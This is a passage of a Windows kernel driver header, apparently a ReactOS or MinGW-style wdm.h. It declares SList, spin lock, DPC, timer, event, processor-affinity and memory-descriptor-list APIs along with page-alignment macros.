    RtlRaiseStatus(STATUS_DATATYPE_MISALIGNMENT);
  }
#endif
  RtlZeroMemory(SListHead, sizeof(SLIST_HEADER));
#if defined(_IA64_)
  FeatureBits = __getReg(CV_IA64_CPUID4);
  if ((FeatureBits & KF_16BYTE_INSTR) != 0) {
    SListHead->Header16.HeaderType = 1;
    SListHead->Header16.Init = 1;
  }
#endif
}

#endif

#if defined(_WIN64)

#define InterlockedPopEntrySList(Head) \
    ExpInterlockedPopEntrySList(Head)

#define InterlockedPushEntrySList(Head, Entry) \
    ExpInterlockedPushEntrySList(Head, Entry)

#define InterlockedFlushSList(Head) \
    ExpInterlockedFlushSList(Head)

#define QueryDepthSList(Head) \
    ExQueryDepthSList(Head)

#else /* !defined(_WIN64) */

NTKERNELAPI
PSLIST_ENTRY
FASTCALL
InterlockedPopEntrySList(
  IN PSLIST_HEADER ListHead);

NTKERNELAPI
PSLIST_ENTRY
FASTCALL
InterlockedPushEntrySList(
  IN PSLIST_HEADER ListHead,
  IN PSLIST_ENTRY ListEntry);

#define InterlockedFlushSList(ListHead) \
    ExInterlockedFlushSList(ListHead)

#define QueryDepthSList(Head) \
    ExQueryDepthSList(Head)

#endif /* !defined(_WIN64) */

#endif /* !defined(_WINBASE_) */

#define RTL_CONTEXT_EX_OFFSET(ContextEx, Chunk) ((ContextEx)->Chunk.Offset)
#define RTL_CONTEXT_EX_LENGTH(ContextEx, Chunk) ((ContextEx)->Chunk.Length)
#define RTL_CONTEXT_EX_CHUNK(Base, Layout, Chunk)       \
    ((PVOID)((PCHAR)(Base) + RTL_CONTEXT_EX_OFFSET(Layout, Chunk)))
#define RTL_CONTEXT_OFFSET(Context, Chunk)              \
    RTL_CONTEXT_EX_OFFSET((PCONTEXT_EX)(Context + 1), Chunk)
#define RTL_CONTEXT_LENGTH(Context, Chunk)              \
    RTL_CONTEXT_EX_LENGTH((PCONTEXT_EX)(Context + 1), Chunk)
#define RTL_CONTEXT_CHUNK(Context, Chunk)               \
    RTL_CONTEXT_EX_CHUNK((PCONTEXT_EX)(Context + 1),    \
                         (PCONTEXT_EX)(Context + 1),    \
                         Chunk)

BOOLEAN
RTLVERLIB_DDI(RtlIsNtDdiVersionAvailable)(
  IN ULONG Version);

BOOLEAN
RTLVERLIB_DDI(RtlIsServicePackVersionInstalled)(
  IN ULONG Version);

#ifndef RtlIsNtDdiVersionAvailable
#define RtlIsNtDdiVersionAvailable WdmlibRtlIsNtDdiVersionAvailable
#endif

#ifndef RtlIsServicePackVersionInstalled
#define RtlIsServicePackVersionInstalled WdmlibRtlIsServicePackVersionInstalled
#endif

#define RtlInterlockedSetBits(Flags, Flag) \
    InterlockedOr((PLONG)(Flags), Flag)

#define RtlInterlockedAndBits(Flags, Flag) \
    InterlockedAnd((PLONG)(Flags), Flag)

#define RtlInterlockedClearBits(Flags, Flag) \
    RtlInterlockedAndBits(Flags, ~(Flag))

#define RtlInterlockedXorBits(Flags, Flag) \
    InterlockedXor(Flags, Flag)

#define RtlInterlockedSetBitsDiscardReturn(Flags, Flag) \
    (VOID) RtlInterlockedSetBits(Flags, Flag)

#define RtlInterlockedAndBitsDiscardReturn(Flags, Flag) \
    (VOID) RtlInterlockedAndBits(Flags, Flag)

#define RtlInterlockedClearBitsDiscardReturn(Flags, Flag) \
    RtlInterlockedAndBitsDiscardReturn(Flags, ~(Flag))


/******************************************************************************
 *                              Kernel Functions                              *
 ******************************************************************************/
NTKERNELAPI
VOID
NTAPI
KeInitializeEvent(
  OUT PRKEVENT Event,
  IN EVENT_TYPE Type,
  IN BOOLEAN State);

NTKERNELAPI
VOID
NTAPI
KeClearEvent(
  IN OUT PRKEVENT Event);

#if (NTDDI_VERSION >= NTDDI_WIN2K)

#if defined(_NTDDK_) || defined(_NTIFS_)
NTKERNELAPI
VOID
NTAPI
ProbeForRead(
  IN CONST VOID *Address, /* CONST is added */
  IN SIZE_T Length,
  IN ULONG Alignment);
#endif /* defined(_NTDDK_) || defined(_NTIFS_) */

NTKERNELAPI
VOID
NTAPI
ProbeForWrite(
  IN PVOID Address,
  IN SIZE_T Length,
  IN ULONG Alignment);

#if defined(SINGLE_GROUP_LEGACY_API)

NTKERNELAPI
VOID
NTAPI
KeRevertToUserAffinityThread(VOID);

NTKERNELAPI
VOID
NTAPI
KeSetSystemAffinityThread(
  IN KAFFINITY Affinity);

NTKERNELAPI
VOID
NTAPI
KeSetTargetProcessorDpc(
  IN OUT PRKDPC Dpc,
  IN CCHAR Number);

NTKERNELAPI
KAFFINITY
NTAPI
KeQueryActiveProcessors(VOID);
#endif /* defined(SINGLE_GROUP_LEGACY_API) */

#if !defined(_M_AMD64)
NTKERNELAPI
ULONGLONG
NTAPI
KeQueryInterruptTime(VOID);

NTKERNELAPI
VOID
NTAPI
KeQuerySystemTime(
  OUT PLARGE_INTEGER CurrentTime);
#endif /* !_M_AMD64 */

#if !defined(_X86_) && !defined(_M_ARM)
NTKERNELAPI
KIRQL
NTAPI
KeAcquireSpinLockRaiseToDpc(
  IN OUT PKSPIN_LOCK SpinLock);

#define KeAcquireSpinLock(SpinLock, OldIrql) \
    *(OldIrql) = KeAcquireSpinLockRaiseToDpc(SpinLock)

NTKERNELAPI
VOID
NTAPI
KeAcquireSpinLockAtDpcLevel(
  IN OUT PKSPIN_LOCK SpinLock);

NTKERNELAPI
VOID
NTAPI
KeReleaseSpinLock(
  IN OUT PKSPIN_LOCK SpinLock,
  IN KIRQL NewIrql);

NTKERNELAPI
VOID
NTAPI
KeReleaseSpinLockFromDpcLevel(
  IN OUT PKSPIN_LOCK SpinLock);
#endif /* !_X86_ */

#if defined(_X86_) && (defined(_WDM_INCLUDED_) || defined(WIN9X_COMPAT_SPINLOCK))
NTKERNELAPI
VOID
NTAPI
KeInitializeSpinLock(
  IN PKSPIN_LOCK SpinLock);
#else
FORCEINLINE
VOID
KeInitializeSpinLock(IN PKSPIN_LOCK SpinLock)
{
  /* Clear the lock */
  *SpinLock = 0;
}
#endif

NTKERNELAPI
DECLSPEC_NORETURN
VOID
NTAPI
KeBugCheckEx(
  IN ULONG BugCheckCode,
  IN ULONG_PTR BugCheckParameter1,
  IN ULONG_PTR BugCheckParameter2,
  IN ULONG_PTR BugCheckParameter3,
  IN ULONG_PTR BugCheckParameter4);

NTKERNELAPI
BOOLEAN
NTAPI
KeCancelTimer(
  IN OUT PKTIMER);

NTKERNELAPI
NTSTATUS
NTAPI
KeDelayExecutionThread(
  IN KPROCESSOR_MODE WaitMode,
  IN BOOLEAN Alertable,
  IN PLARGE_INTEGER Interval);

NTKERNELAPI
BOOLEAN
NTAPI
KeDeregisterBugCheckCallback(
  IN OUT PKBUGCHECK_CALLBACK_RECORD CallbackRecord);

NTKERNELAPI
VOID
NTAPI
KeEnterCriticalRegion(VOID);

NTKERNELAPI
VOID
NTAPI
KeInitializeDeviceQueue(
  OUT PKDEVICE_QUEUE DeviceQueue);

NTKERNELAPI
VOID
NTAPI
KeInitializeDpc(
  OUT PRKDPC Dpc,
  IN PKDEFERRED_ROUTINE DeferredRoutine,
  IN PVOID DeferredContext OPTIONAL);

NTKERNELAPI
VOID
NTAPI
KeInitializeMutex(
  OUT PRKMUTEX Mutex,
  IN ULONG Level);

NTKERNELAPI
VOID
NTAPI
KeInitializeSemaphore(
  OUT PRKSEMAPHORE Semaphore,
  IN LONG Count,
  IN LONG Limit);

NTKERNELAPI
VOID
NTAPI
KeInitializeTimer(
  OUT PKTIMER Timer);

NTKERNELAPI
VOID
NTAPI
KeInitializeTimerEx(
  OUT PKTIMER Timer,
  IN TIMER_TYPE Type);

NTKERNELAPI
BOOLEAN
NTAPI
KeInsertByKeyDeviceQueue(
  IN OUT PKDEVICE_QUEUE DeviceQueue,
  IN OUT PKDEVICE_QUEUE_ENTRY DeviceQueueEntry,
  IN ULONG SortKey);

NTKERNELAPI
BOOLEAN
NTAPI
KeInsertDeviceQueue(
  IN OUT PKDEVICE_QUEUE DeviceQueue,
  IN OUT PKDEVICE_QUEUE_ENTRY DeviceQueueEntry);

NTKERNELAPI
BOOLEAN
NTAPI
KeInsertQueueDpc(
  IN OUT PRKDPC Dpc,
  IN PVOID SystemArgument1 OPTIONAL,
  IN PVOID SystemArgument2 OPTIONAL);

NTKERNELAPI
VOID
NTAPI
KeLeaveCriticalRegion(VOID);

NTHALAPI
LARGE_INTEGER
NTAPI
KeQueryPerformanceCounter(
  OUT PLARGE_INTEGER PerformanceFrequency OPTIONAL);

NTKERNELAPI
KPRIORITY
NTAPI
KeQueryPriorityThread(
  IN PRKTHREAD Thread);

NTKERNELAPI
ULONG
NTAPI
KeQueryTimeIncrement(VOID);

NTKERNELAPI
LONG
NTAPI
KeReadStateEvent(
  IN PRKEVENT Event);

NTKERNELAPI
LONG
NTAPI
KeReadStateMutex(
  IN PRKMUTEX Mutex);

NTKERNELAPI
LONG
NTAPI
KeReadStateSemaphore(
  IN PRKSEMAPHORE Semaphore);

NTKERNELAPI
BOOLEAN
NTAPI
KeReadStateTimer(
  IN PKTIMER Timer);

NTKERNELAPI
BOOLEAN
NTAPI
KeRegisterBugCheckCallback(
  OUT PKBUGCHECK_CALLBACK_RECORD CallbackRecord,
  IN PKBUGCHECK_CALLBACK_ROUTINE CallbackRoutine,
  IN PVOID Buffer,
  IN ULONG Length,
  IN PUCHAR Component);

NTKERNELAPI
LONG
NTAPI
KeReleaseMutex(
  IN OUT PRKMUTEX Mutex,
  IN BOOLEAN Wait);

NTKERNELAPI
LONG
NTAPI
KeReleaseSemaphore(
  IN OUT PRKSEMAPHORE Semaphore,
  IN KPRIORITY Increment,
  IN LONG Adjustment,
  IN BOOLEAN Wait);

NTKERNELAPI
PKDEVICE_QUEUE_ENTRY
NTAPI
KeRemoveByKeyDeviceQueue(
  IN OUT PKDEVICE_QUEUE DeviceQueue,
  IN ULONG SortKey);

NTKERNELAPI
PKDEVICE_QUEUE_ENTRY
NTAPI
KeRemoveDeviceQueue(
  IN OUT PKDEVICE_QUEUE DeviceQueue);

NTKERNELAPI
BOOLEAN
NTAPI
KeRemoveEntryDeviceQueue(
  IN OUT PKDEVICE_QUEUE DeviceQueue,
  IN OUT PKDEVICE_QUEUE_ENTRY DeviceQueueEntry);

NTKERNELAPI
BOOLEAN
NTAPI
KeRemoveQueueDpc(
  IN OUT PRKDPC Dpc);

NTKERNELAPI
LONG
NTAPI
KeResetEvent(
  IN OUT PRKEVENT Event);

NTKERNELAPI
LONG
NTAPI
KeSetEvent(
  IN OUT PRKEVENT Event,
  IN KPRIORITY Increment,
  IN BOOLEAN Wait);

NTKERNELAPI
VOID
NTAPI
KeSetImportanceDpc(
  IN OUT PRKDPC Dpc,
  IN KDPC_IMPORTANCE Importance);

NTKERNELAPI
KPRIORITY
NTAPI
KeSetPriorityThread(
  IN OUT PKTHREAD Thread,
  IN KPRIORITY Priority);

NTKERNELAPI
BOOLEAN
NTAPI
KeSetTimer(
  IN OUT PKTIMER Timer,
  IN LARGE_INTEGER DueTime,
  IN PKDPC Dpc OPTIONAL);

NTKERNELAPI
BOOLEAN
NTAPI
KeSetTimerEx(
  IN OUT PKTIMER Timer,
  IN LARGE_INTEGER DueTime,
  IN LONG Period OPTIONAL,
  IN PKDPC Dpc OPTIONAL);

NTHALAPI
VOID
NTAPI
KeStallExecutionProcessor(
  IN ULONG MicroSeconds);

NTKERNELAPI
BOOLEAN
NTAPI
KeSynchronizeExecution(
  IN OUT PKINTERRUPT Interrupt,
  IN PKSYNCHRONIZE_ROUTINE SynchronizeRoutine,
  IN PVOID SynchronizeContext OPTIONAL);

NTKERNELAPI
NTSTATUS
NTAPI
KeWaitForMultipleObjects(
  IN ULONG Count,
  IN PVOID Object[],
  IN WAIT_TYPE WaitType,
  IN KWAIT_REASON WaitReason,
  IN KPROCESSOR_MODE WaitMode,
  IN BOOLEAN Alertable,
  IN PLARGE_INTEGER Timeout OPTIONAL,
  OUT PKWAIT_BLOCK WaitBlockArray OPTIONAL);

#define KeWaitForMutexObject KeWaitForSingleObject

NTKERNELAPI
NTSTATUS
NTAPI
KeWaitForSingleObject(
  IN PVOID Object,
  IN KWAIT_REASON WaitReason,
  IN KPROCESSOR_MODE WaitMode,
  IN BOOLEAN Alertable,
  IN PLARGE_INTEGER Timeout OPTIONAL);

#endif /* (NTDDI_VERSION >= NTDDI_WIN2K) */

#if (NTDDI_VERSION >= NTDDI_WINXP)

_DECL_HAL_KE_IMPORT
VOID
FASTCALL
KeAcquireInStackQueuedSpinLock(
  IN OUT PKSPIN_LOCK SpinLock,
  OUT PKLOCK_QUEUE_HANDLE LockHandle);

NTKERNELAPI
VOID
FASTCALL
KeAcquireInStackQueuedSpinLockAtDpcLevel(
  IN OUT PKSPIN_LOCK SpinLock,
  OUT PKLOCK_QUEUE_HANDLE LockHandle);

NTKERNELAPI
KIRQL
NTAPI
KeAcquireInterruptSpinLock(
  IN OUT PKINTERRUPT Interrupt);

NTKERNELAPI
BOOLEAN
NTAPI
KeAreApcsDisabled(VOID);

NTKERNELAPI
ULONG
NTAPI
KeGetRecommendedSharedDataAlignment(VOID);

NTKERNELAPI
ULONG
NTAPI
KeQueryRuntimeThread(
  IN PKTHREAD Thread,
  OUT PULONG UserTime);

NTKERNELAPI
VOID
FASTCALL
KeReleaseInStackQueuedSpinLockFromDpcLevel(
  IN PKLOCK_QUEUE_HANDLE LockHandle);

NTKERNELAPI
VOID
NTAPI
KeReleaseInterruptSpinLock(
  IN OUT PKINTERRUPT Interrupt,
  IN KIRQL OldIrql);

NTKERNELAPI
PKDEVICE_QUEUE_ENTRY
NTAPI
KeRemoveByKeyDeviceQueueIfBusy(
  IN OUT PKDEVICE_QUEUE DeviceQueue,
  IN ULONG SortKey);

_DECL_HAL_KE_IMPORT
VOID
FASTCALL
KeReleaseInStackQueuedSpinLock(
  IN PKLOCK_QUEUE_HANDLE LockHandle);

#endif /* (NTDDI_VERSION >= NTDDI_WINXP) */

#if (NTDDI_VERSION >= NTDDI_WINXPSP1)

NTKERNELAPI
BOOLEAN
NTAPI
KeDeregisterBugCheckReasonCallback(
  IN OUT PKBUGCHECK_REASON_CALLBACK_RECORD CallbackRecord);

NTKERNELAPI
BOOLEAN
NTAPI
KeRegisterBugCheckReasonCallback(
  OUT PKBUGCHECK_REASON_CALLBACK_RECORD CallbackRecord,
  IN PKBUGCHECK_REASON_CALLBACK_ROUTINE CallbackRoutine,
  IN KBUGCHECK_CALLBACK_REASON Reason,
  IN PUCHAR Component);

#endif /* (NTDDI_VERSION >= NTDDI_WINXPSP1) */

#if (NTDDI_VERSION >= NTDDI_WINXPSP2)
NTKERNELAPI
VOID
NTAPI
KeFlushQueuedDpcs(VOID);
#endif /* (NTDDI_VERSION >= NTDDI_WINXPSP2) */
#if (NTDDI_VERSION >= NTDDI_WS03)

NTKERNELAPI
PVOID
NTAPI
KeRegisterNmiCallback(
  IN PNMI_CALLBACK CallbackRoutine,
  IN PVOID Context OPTIONAL);

NTKERNELAPI
NTSTATUS
NTAPI
KeDeregisterNmiCallback(
  IN PVOID Handle);

NTKERNELAPI
VOID
NTAPI
KeInitializeThreadedDpc(
  OUT PRKDPC Dpc,
  IN PKDEFERRED_ROUTINE DeferredRoutine,
  IN PVOID DeferredContext OPTIONAL);

NTKERNELAPI
ULONG_PTR
NTAPI
KeIpiGenericCall(
  IN PKIPI_BROADCAST_WORKER BroadcastFunction,
  IN ULONG_PTR Context);

NTKERNELAPI
KIRQL
FASTCALL
KeAcquireSpinLockForDpc(
  IN OUT PKSPIN_LOCK SpinLock);

NTKERNELAPI
VOID
FASTCALL
KeReleaseSpinLockForDpc(
  IN OUT PKSPIN_LOCK SpinLock,
  IN KIRQL OldIrql);

NTKERNELAPI
BOOLEAN
FASTCALL
KeTestSpinLock(
  IN PKSPIN_LOCK SpinLock);

#endif /* (NTDDI_VERSION >= NTDDI_WS03) */

#if (NTDDI_VERSION >= NTDDI_WS03SP1)

NTKERNELAPI
BOOLEAN
FASTCALL
KeTryToAcquireSpinLockAtDpcLevel(
  IN OUT PKSPIN_LOCK SpinLock);

NTKERNELAPI
BOOLEAN
NTAPI
KeAreAllApcsDisabled(VOID);

NTKERNELAPI
VOID
FASTCALL
KeAcquireGuardedMutex(
  IN OUT PKGUARDED_MUTEX GuardedMutex);

NTKERNELAPI
VOID
FASTCALL
KeAcquireGuardedMutexUnsafe(
  IN OUT PKGUARDED_MUTEX GuardedMutex);

NTKERNELAPI
VOID
NTAPI
KeEnterGuardedRegion(VOID);

NTKERNELAPI
VOID
NTAPI
KeLeaveGuardedRegion(VOID);

NTKERNELAPI
VOID
FASTCALL
KeInitializeGuardedMutex(
  OUT PKGUARDED_MUTEX GuardedMutex);

NTKERNELAPI
VOID
FASTCALL
KeReleaseGuardedMutexUnsafe(
  IN OUT PKGUARDED_MUTEX GuardedMutex);

NTKERNELAPI
VOID
FASTCALL
KeReleaseGuardedMutex(
  IN OUT PKGUARDED_MUTEX GuardedMutex);

NTKERNELAPI
BOOLEAN
FASTCALL
KeTryToAcquireGuardedMutex(
  IN OUT PKGUARDED_MUTEX GuardedMutex);
#endif /* (NTDDI_VERSION >= NTDDI_WS03SP1) */

#if (NTDDI_VERSION >= NTDDI_VISTA)
NTKERNELAPI
VOID
FASTCALL
KeAcquireInStackQueuedSpinLockForDpc(
  IN OUT PKSPIN_LOCK SpinLock,
  OUT PKLOCK_QUEUE_HANDLE LockHandle);

NTKERNELAPI
VOID
FASTCALL
KeReleaseInStackQueuedSpinLockForDpc(
  IN PKLOCK_QUEUE_HANDLE LockHandle);

NTKERNELAPI
NTSTATUS
NTAPI
KeQueryDpcWatchdogInformation(
  OUT PKDPC_WATCHDOG_INFORMATION WatchdogInformation);
#if defined(SINGLE_GROUP_LEGACY_API)

NTKERNELAPI
KAFFINITY
NTAPI
KeSetSystemAffinityThreadEx(
  IN KAFFINITY Affinity);

NTKERNELAPI
VOID
NTAPI
KeRevertToUserAffinityThreadEx(
  IN KAFFINITY Affinity);

NTKERNELAPI
ULONG
NTAPI
KeQueryActiveProcessorCount(
  OUT PKAFFINITY ActiveProcessors OPTIONAL);

NTKERNELAPI
ULONG
NTAPI
KeQueryMaximumProcessorCount(VOID);
#endif /* SINGLE_GROUP_LEGACY_API */

#endif /* (NTDDI_VERSION >= NTDDI_VISTA) */

#if (NTDDI_VERSION >= NTDDI_WS08)

PVOID
KeRegisterProcessorChangeCallback(
  IN PPROCESSOR_CALLBACK_FUNCTION CallbackFunction,
  IN PVOID CallbackContext OPTIONAL,
  IN ULONG Flags);

VOID
KeDeregisterProcessorChangeCallback(
  IN PVOID CallbackHandle);

#endif /* (NTDDI_VERSION >= NTDDI_WS08) */
#if (NTDDI_VERSION >= NTDDI_WIN7)

ULONG64
NTAPI
KeQueryTotalCycleTimeProcess(
  IN OUT PKPROCESS Process,
  OUT PULONG64 CycleTimeStamp);

ULONG64
NTAPI
KeQueryTotalCycleTimeThread(
  IN OUT PKTHREAD Thread,
  OUT PULONG64 CycleTimeStamp);

NTKERNELAPI
NTSTATUS
NTAPI
KeSetTargetProcessorDpcEx(
  IN OUT PKDPC Dpc,
  IN PPROCESSOR_NUMBER ProcNumber);

NTKERNELAPI
VOID
NTAPI
KeSetSystemGroupAffinityThread(
  IN PGROUP_AFFINITY Affinity,
  OUT PGROUP_AFFINITY PreviousAffinity OPTIONAL);

NTKERNELAPI
VOID
NTAPI
KeRevertToUserGroupAffinityThread(
  IN PGROUP_AFFINITY PreviousAffinity);

NTKERNELAPI
BOOLEAN
NTAPI
KeSetCoalescableTimer(
  IN OUT PKTIMER Timer,
  IN LARGE_INTEGER DueTime,
  IN ULONG Period,
  IN ULONG TolerableDelay,
  IN PKDPC Dpc OPTIONAL);

NTKERNELAPI
ULONGLONG
NTAPI
KeQueryUnbiasedInterruptTime(VOID);

NTKERNELAPI
ULONG
NTAPI
KeQueryActiveProcessorCountEx(
  IN USHORT GroupNumber);

NTKERNELAPI
ULONG
NTAPI
KeQueryMaximumProcessorCountEx(
  IN USHORT GroupNumber);

NTKERNELAPI
USHORT
NTAPI
KeQueryActiveGroupCount(VOID);

NTKERNELAPI
USHORT
NTAPI
KeQueryMaximumGroupCount(VOID);

NTKERNELAPI
KAFFINITY
NTAPI
KeQueryGroupAffinity(
  IN USHORT GroupNumber);

NTKERNELAPI
ULONG
NTAPI
KeGetCurrentProcessorNumberEx(
  OUT PPROCESSOR_NUMBER ProcNumber OPTIONAL);

NTKERNELAPI
VOID
NTAPI
KeQueryNodeActiveAffinity(
  IN USHORT NodeNumber,
  OUT PGROUP_AFFINITY Affinity OPTIONAL,
  OUT PUSHORT Count OPTIONAL);

NTKERNELAPI
USHORT
NTAPI
KeQueryNodeMaximumProcessorCount(
  IN USHORT NodeNumber);

NTKERNELAPI
USHORT
NTAPI
KeQueryHighestNodeNumber(VOID);

NTKERNELAPI
USHORT
NTAPI
KeGetCurrentNodeNumber(VOID);

NTKERNELAPI
NTSTATUS
NTAPI
KeQueryLogicalProcessorRelationship(
  IN PPROCESSOR_NUMBER ProcessorNumber OPTIONAL,
  IN LOGICAL_PROCESSOR_RELATIONSHIP RelationshipType,
  OUT PSYSTEM_LOGICAL_PROCESSOR_INFORMATION_EX Information OPTIONAL,
  IN OUT PULONG Length);

NTKERNELAPI
NTSTATUS
NTAPI
KeSaveExtendedProcessorState(
  IN ULONG64 Mask,
  OUT PXSTATE_SAVE XStateSave);

NTKERNELAPI
VOID
NTAPI
KeRestoreExtendedProcessorState(
  IN PXSTATE_SAVE XStateSave);

NTSTATUS
NTAPI
KeGetProcessorNumberFromIndex(
  IN ULONG ProcIndex,
  OUT PPROCESSOR_NUMBER ProcNumber);

ULONG
NTAPI
KeGetProcessorIndexFromNumber(
  IN PPROCESSOR_NUMBER ProcNumber);
#endif /* (NTDDI_VERSION >= NTDDI_WIN7) */
#if !defined(_IA64_)
NTHALAPI
VOID
NTAPI
KeFlushWriteBuffer(VOID);
#endif

/* VOID
 * KeInitializeCallbackRecord(
 *   IN PKBUGCHECK_CALLBACK_RECORD  CallbackRecord)
 */
#define KeInitializeCallbackRecord(CallbackRecord) \
  CallbackRecord->State = BufferEmpty;

#if DBG

#if (NTDDI_VERSION >= NTDDI_VISTA)
#define PAGED_ASSERT( exp ) NT_ASSERT( exp )
#else
#define PAGED_ASSERT( exp ) ASSERT( exp )
#endif

#define PAGED_CODE() { \
  if (KeGetCurrentIrql() > APC_LEVEL) { \
    KdPrint( ("NTDDK: Pageable code called at IRQL > APC_LEVEL (%d)\n", KeGetCurrentIrql() )); \
    PAGED_ASSERT(FALSE); \
  } \
}

#else

#define PAGED_CODE()

#endif /* DBG */

#define PAGED_CODE_LOCKED() NOP_FUNCTION;

/******************************************************************************
 *                       Memory manager Functions                             *
 ******************************************************************************/
/* Alignment Macros */
#define ALIGN_DOWN_BY(size, align) \
    ((ULONG_PTR)(size) & ~((ULONG_PTR)(align) - 1))

#define ALIGN_UP_BY(size, align) \
    (ALIGN_DOWN_BY(((ULONG_PTR)(size) + align - 1), align))

#define ALIGN_DOWN_POINTER_BY(ptr, align) \
    ((PVOID)ALIGN_DOWN_BY(ptr, align))

#define ALIGN_UP_POINTER_BY(ptr, align) \
    ((PVOID)ALIGN_UP_BY(ptr, align))

#define ALIGN_DOWN(size, type) \
    ALIGN_DOWN_BY(size, sizeof(type))

#define ALIGN_UP(size, type) \
    ALIGN_UP_BY(size, sizeof(type))

#define ALIGN_DOWN_POINTER(ptr, type) \
    ALIGN_DOWN_POINTER_BY(ptr, sizeof(type))

#define ALIGN_UP_POINTER(ptr, type) \
    ALIGN_UP_POINTER_BY(ptr, sizeof(type))

#ifndef FIELD_OFFSET
#define FIELD_OFFSET(type, field) ((ULONG)&(((type *)0)->field))
#endif

#ifndef FIELD_SIZE
#define FIELD_SIZE(type, field) (sizeof(((type *)0)->field))
#endif

#define POOL_TAGGING                             1

#if DBG
#define IF_DEBUG if (TRUE)
#else
#define IF_DEBUG if (FALSE)
#endif /* DBG */

/* ULONG
 * BYTE_OFFSET(
 *   IN PVOID Va)
 */
#define BYTE_OFFSET(Va) \
  ((ULONG) ((ULONG_PTR) (Va) & (PAGE_SIZE - 1)))

/* ULONG
 * BYTES_TO_PAGES(
 *   IN ULONG Size)
 *
 * Note: This needs to be like this to avoid overflows!
 */
#define BYTES_TO_PAGES(Size) \
  (((Size) >> PAGE_SHIFT) + (((Size) & (PAGE_SIZE - 1)) != 0))

/* PVOID
 * PAGE_ALIGN(
 *   IN PVOID Va)
 */
#define PAGE_ALIGN(Va) \
  ((PVOID) ((ULONG_PTR)(Va) & ~(PAGE_SIZE - 1)))

/* ULONG_PTR
 * ROUND_TO_PAGES(
 *   IN ULONG_PTR Size)
 */
#define ROUND_TO_PAGES(Size) \
  (((ULONG_PTR) (Size) + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1))

/* ULONG
 * ADDRESS_AND_SIZE_TO_SPAN_PAGES(
 *   IN PVOID Va,
 *   IN ULONG Size)
 */
#define ADDRESS_AND_SIZE_TO_SPAN_PAGES(_Va, _Size) \
  ((ULONG) ((((ULONG_PTR) (_Va) & (PAGE_SIZE - 1)) \
    + (_Size) + (PAGE_SIZE - 1)) >> PAGE_SHIFT))

#define COMPUTE_PAGES_SPANNED(Va, Size) \
    ADDRESS_AND_SIZE_TO_SPAN_PAGES(Va,Size)

/*
 * ULONG
 * MmGetMdlByteCount(
 *   IN PMDL  Mdl)
 */
#define MmGetMdlByteCount(_Mdl) \
  ((_Mdl)->ByteCount)

/*
 * ULONG
 * MmGetMdlByteOffset(
 *   IN PMDL  Mdl)
 */
#define MmGetMdlByteOffset(_Mdl) \
  ((_Mdl)->ByteOffset)

#define MmGetMdlBaseVa(Mdl) ((Mdl)->StartVa)

/*
 * PPFN_NUMBER
 * MmGetMdlPfnArray(
 *   IN PMDL  Mdl)
 */
#define MmGetMdlPfnArray(_Mdl) \
  ((PPFN_NUMBER) ((_Mdl) + 1))

/*
 * PVOID
 * MmGetMdlVirtualAddress(
 *   IN PMDL  Mdl)
 */
#define MmGetMdlVirtualAddress(_Mdl) \
  ((PVOID) ((PCHAR) ((_Mdl)->StartVa) + (_Mdl)->ByteOffset))

#define MmGetProcedureAddress(Address) (Address)
#define MmLockPagableCodeSection(Address) MmLockPagableDataSection(Address)

/* PVOID MmGetSystemAddressForMdl(
 *     IN PMDL Mdl);
 */
#define MmGetSystemAddressForMdl(Mdl) \
  (((Mdl)->MdlFlags & (MDL_MAPPED_TO_SYSTEM_VA | \
    MDL_SOURCE_IS_NONPAGED_POOL)) ? \
      ((Mdl)->MappedSystemVa) : \
      (MmMapLockedPages((Mdl), KernelMode)))

/* PVOID
 * MmGetSystemAddressForMdlSafe(
 *     IN PMDL Mdl,
 *     IN MM_PAGE_PRIORITY Priority)
 */
#define MmGetSystemAddressForMdlSafe(_Mdl, _Priority) \
  (((_Mdl)->MdlFlags & (MDL_MAPPED_TO_SYSTEM_VA \
    | MDL_SOURCE_IS_NONPAGED_POOL)) ? \
    (_Mdl)->MappedSystemVa : \
    (PVOID) MmMapLockedPagesSpecifyCache((_Mdl), \
      KernelMode, MmCached, NULL, FALSE, (_Priority)))

/*
 * VOID
 * MmInitializeMdl(
 *   IN PMDL  MemoryDescriptorList,
 *   IN PVOID  BaseVa,
 *   IN SIZE_T  Length)
 */
#define MmInitializeMdl(_MemoryDescriptorList, \
                        _BaseVa, \
                        _Length) \
{ \
  (_MemoryDescriptorList)->Next = (PMDL) NULL; \
  (_MemoryDescriptorList)->Size = (CSHORT) (sizeof(MDL) + \
    (sizeof(PFN_NUMBER) * ADDRESS_AND_SIZE_TO_SPAN_PAGES(_BaseVa, _Length))); \
  (_MemoryDescriptorList)->MdlFlags = 0; \
  (_MemoryDescriptorList)->StartVa = (PVOID) PAGE_ALIGN(_BaseVa); \
  (_MemoryDescriptorList)->ByteOffset = BYTE_OFFSET(_BaseVa); \
  (_MemoryDescriptorList)->ByteCount = (ULONG) _Length; \
}

/*
 * VOID
 * MmPrepareMdlForReuse(
 *   IN PMDL  Mdl)
 */
#define MmPrepareMdlForReuse(_Mdl) \
{ \
  if (((_Mdl)->MdlFlags & MDL_PARTIAL_HAS_BEEN_MAPPED) != 0) { \
    ASSERT(((_Mdl)->MdlFlags & MDL_PARTIAL) != 0); \
    MmUnmapLockedPages((_Mdl)->MappedSystemVa, (_Mdl)); \
  } else if (((_Mdl)->MdlFlags & MDL_PARTIAL) == 0) { \
    ASSERT(((_Mdl)->MdlFlags & MDL_MAPPED_TO_SYSTEM_VA) == 0); \
  } \
}

#if (NTDDI_VERSION >= NTDDI_WIN2K)
NTKERNELAPI
PVOID
NTAPI
MmAllocateContiguousMemory(
  IN SIZE_T NumberOfBytes,
  IN PHYSICAL_ADDRESS HighestAcceptableAddress);

NTKERNELAPI
PVOID
NTAPI
MmAllocateContiguousMemorySpecifyCache(
  IN SIZE_T NumberOfBytes,
  IN PHYSICAL_ADDRESS LowestAcceptableAddress,
  IN PHYSICAL_ADDRESS HighestAcceptableAddress,
  IN PHYSICAL_ADDRESS BoundaryAddressMultiple OPTIONAL,
  IN MEMORY_CACHING_TYPE CacheType);

NTKERNELAPI
PMDL
NTAPI
MmAllocatePagesForMdl(
  IN PHYSICAL_ADDRESS LowAddress,
  IN PHYSICAL_ADDRESS HighAddress,
  IN PHYSICAL_ADDRESS SkipBytes,
  IN SIZE_T TotalBytes);

NTKERNELAPI
VOID
NTAPI
MmBuildMdlForNonPagedPool(
  IN OUT PMDLX MemoryDescriptorList);

//DECLSPEC_DEPRECATED_DDK
NTKERNELAPI
PMDL
NTAPI
MmCreateMdl(
  IN PMDL MemoryDescriptorList OPTIONAL,
  IN PVOID Base,
  IN SIZE_T Length);

